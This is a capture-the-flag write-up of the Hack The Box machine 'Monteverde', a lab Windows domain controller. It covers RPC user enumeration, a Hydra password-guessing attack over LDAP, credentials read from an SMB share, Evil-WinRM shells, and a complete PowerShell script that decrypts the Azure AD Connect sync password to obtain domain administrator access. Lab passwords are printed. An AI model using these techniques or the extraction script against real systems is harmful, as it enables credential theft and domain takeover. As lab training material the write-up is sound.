---
permalink: /posts/HTB/Monteverde
title:  "HTB Monteverde"
author: Luc Kolen
description: "Monteverde is a medium Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Medium
  - Windows
  - RPC
  - LDAP
  - Hydra
  - SMB
  - Azure Admin group
---
# 10.10.10.172 - Monteverde

- [10.10.10.172 - Monteverde](#101010172---monteverde)
  - [Open ports](#open-ports)
    - [TCP](#tcp)
    - [UDP](#udp)
  - [RPC](#rpc)
  - [Brute force user password](#brute-force-user-password)
  - [SMB](#smb)
  - [Evil-WinRM as mhope](#evil-winrm-as-mhope)
  - [Privilege escalation via Azure Admins group](#privilege-escalation-via-azure-admins-group)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [SABatchJobs username via LDAP](#sabatchjobs-username-via-ldap)

## Open ports

### TCP

```bash
luc@kali:~/HTB/Monteverde$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.172
```

|Port|Service|Version
|---|---|---|
53/tcp|domain?|
88/tcp|kerberos-sec|Microsoft Windows Kerberos (server time: 2020-05-08 13:55:21Z)
135/tcp|msrpc|Microsoft Windows RPC
139/tcp|netbios-ssn|Microsoft Windows netbios-ssn
389/tcp|ldap|Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp|microsoft-ds?|
464/tcp|kpasswd5?|
593/tcp|ncacn_http|Microsoft Windows RPC over HTTP 1.0
636/tcp|tcpwrapped|
3268/tcp|ldap|Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp|tcpwrapped|
5985/tcp|http|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp|mc-nmf|.NET Message Framing
49667/tcp|msrpc|Microsoft Windows RPC
49673/tcp|ncacn_http|Microsoft Windows RPC over HTTP 1.0
49674/tcp|msrpc|Microsoft Windows RPC
49677/tcp|msrpc|Microsoft Windows RPC
49706/tcp|msrpc|Microsoft Windows RPC

### UDP

```bash
luc@kali:~/HTB/Monteverde$ nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all 10.10.10.172
```

|Port|Service|Version
|---|---|---|
53/udp|domain|(generic dns response: SERVFAIL)

## RPC

We can list users on the machine via `rpcclient`. We don't need to send an username and password to connect.

```bash
luc@kali:~/HTB/Monteverde$ rpcclient 10.10.10.172 -U '' -N
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

## Brute force user password

We haven't found any passwords or password hints, but we can always guess on users being lazy. We can try the usernames as passwords. We also need a service that is supported by Hydra that we can do our brute force attack on, in this case we'll use LDAP.

```bash
luc@kali:~/HTB/Monteverde$ printf 'Guest\nAAD_987d7f2f57d2\nmhope\nSABatchJobs\nsvc-ata\nsvc-bexec\nsvc-netapp\ndgalanos\nroleary\nsmorgan' > users.txt
luc@kali:~/HTB/Monteverde$ hydra -L users.txt -P users.txt 10.10.10.172 ldap2
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-13 12:28:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:10/p:10), ~7 tries per task
[DATA] attacking ldap2://10.10.10.172:389/
[389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: SABatchJobs
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-13 12:28:34
```

We've found one set of valid user credentials, username `SABatchJobs` with password `SABatchJobs`.

## SMB

We can use those user credentials to see what access we have on the machine via SMB.

```bash
luc@kali:~/HTB/Monteverde$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
[+] IP: 10.10.10.172:445        Name: 10.10.10.172
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        users$                                                  READ ONLY
```

We've access to multiple shares, we can mount them all or we can rerun `smbmap` with the `-R` argument to see all files we've access to.

```bash
luc@kali:~/HTB/Monteverde$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R
...
.\users$\mhope\*
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    .
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    ..
        fw--w--w--             1212 Fri Jan  3 15:59:24 2020    azure.xml
...

```

This `azure.xml` file could be interesting because we've access to it and it's in the directory of another user.

```bash
luc@kali:~/HTB/Monteverde$  smbclient \\\\10.10.10.172\\users$ -U SABatchJobs SABatchJobs
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \> cd mhope
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 14:41:18 2020
  ..                                  D        0  Fri Jan  3 14:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (16.4 KiloBytes/sec) (average 16.4 KiloBytes/sec)
smb: \mhope\> exit
luc@kali:~/HTB/Monteverde$ cat azure.xml 
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

We were right with our guess that this file could have interesting information, we get the password `4n0therD4y@n0th3r$`.

## Evil-WinRM as mhope

```bash
luc@kali:~/HTB/Monteverde$ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
4961976b************************
```

## Privilege escalation via Azure Admins group

We've our connection as mhope, but we don't have administrator/system access yet.

```bash
*Evil-WinRM* PS C:\> whoami /groups
...
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
...
```

We're part of the `Azure Admins` group, this sounds interesting. [XPN](https://blog.xpnsec.com/azuread-connect-for-redteam/) wrote a blog post about using the `Azure Admins` group to extract the Admin credentials. This script is copied from that blog post.

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

We'll need to make one change to this script to make it work in our situation, the correct connection string. We can find this in our Evil-WinRM session as mhope.

```bash
*Evil-WinRM* PS C:\> hostname
MONTEVERDE
*Evil-WinRM* PS C:\> Connect-AdSyncDatabase -Server MONTEVERDE
...
ConnectionString                 : Data Source=tcp:MONTEVERDE\;Integrated Security=True
...
```

The updated code in the Admin.ps1 script will be:

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=tcp:MONTEVERDE\;Integrated Security=True;Initial Catalog=ADSync"
```

```bash
*Evil-WinRM* PS C:\Users\mhope\Downloads> upload Admin.ps1
Info: Uploading Admin.ps1 to C:\Users\mhope\Downloads\Admin.ps1

Data: 2348 bytes of 2348 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\mhope\Downloads> dir

    Directory: C:\Users\mhope\Downloads

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/13/2020   3:02 AM           1763 Admin.ps1

*Evil-WinRM* PS C:\Users\mhope\Downloads> .\Admin.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

We can now login as the Administrator with these credentials.

```bash
luc@kali:~/HTB/Monteverde$ evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
12909612************************
```

## TL;DR

- Anonymous RPC login results in list of usernames
- SABatchJobs accounts has its username as password
- Mhope credentials are in file accessible via SMB as SABatchJobs
- Mhope is in the Azure Admins group which can extract the administrator password

## Bonus

### SABatchJobs username via LDAP

We used `rpcclient` to get a list of usernames, but we also could've used `ldapsearch` because that also allows anonymous connections on this machine.

```bash
ldapsearch -x -h 10.10.10.172 -s base
...
rootDomainNamingContext: DC=MEGABANK,DC=LOCAL
...
luc@kali:~/HTB/Monteverde$ ldapsearch -x -h 10.10.10.172 -s sub -b 'DC=MEGABANK,DC=LOCAL'
...
# SABatchJobs, Service Accounts, MEGABANK.LOCAL
dn: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SABatchJobs
givenName: SABatchJobs
distinguishedName: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103124846.0Z
whenChanged: 20200612193534.0Z
displayName: SABatchJobs
uSNCreated: 41070
uSNChanged: 65617
name: SABatchJobs
objectGUID:: A2gA4Cnwv0eHK29I4GEMLQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132365145811324166
lastLogoff: 0
lastLogon: 132365146595387892
pwdLastSet: 132225293263922346
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKgoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SABatchJobs
sAMAccountType: 805306368
userPrincipalName: SABatchJobs@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103124846.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: A2gA4Cnwv0eHK29I4GEMLQ==
lastLogonTimestamp: 132364641349308291
...
```

This would've also shown the SABatchJobs account that we used to get into the SMB shares.
